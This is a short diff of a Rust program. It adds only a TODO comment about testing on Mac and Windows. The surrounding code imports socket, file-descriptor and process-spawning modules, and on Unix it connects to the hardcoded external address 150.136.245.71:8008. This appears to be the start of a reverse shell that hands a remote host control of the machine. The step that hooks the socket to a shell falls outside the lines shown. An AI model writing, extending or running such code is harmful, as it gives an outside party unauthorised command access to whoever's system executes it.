@@ -2,6 +2,7 @@ use std::net::TcpStream;
 use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 
+// TODO: test mac and windows
 pub fn main() {
     if cfg!(unix) {
         let x = TcpStream::connect("150.136.245.71:8008").unwrap();
